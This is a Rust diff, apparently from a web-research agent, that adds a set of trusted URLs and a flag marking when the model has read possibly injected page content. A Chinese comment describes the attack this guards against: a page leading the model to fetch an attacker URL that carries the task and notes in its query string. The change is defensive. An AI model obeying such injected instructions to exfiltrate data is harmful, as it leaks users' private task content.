@@ -77,6 +77,8 @@ pub async fn run(
         verdict: None,
         candidates: Vec::new(),
         seeds: HashSet::new(),
+        known: HashSet::new(),
+        untrusted: false,
         read: HashSet::new(),
         evidence: Vec::new(),
         fresh: Vec::new(),
@@ -116,6 +118,11 @@ struct Run<'a> {
     candidates: Vec<Candidate>,
     /// 调用方给的网址：不算盲探。
     seeds: HashSet<String>,
+    /// 来路清楚的网址：调用方给的、搜索和 map 返回的、读过的页面上链接的。
+    known: HashSet<String>,
+    /// 模型已经读到网页内容（可能带注入的指令）：之后只能打开 `known` 里的网址，
+    /// 否则页面可以让它去抓 `https://攻击者/?q=<任务和笔记>`。
+    untrusted: bool,
     /// 抓过的网址（成功、失败、被 robots 拒绝都算），不再抓第二次。
     read: HashSet<String>,
     evidence: Vec<AgentEvidence>,
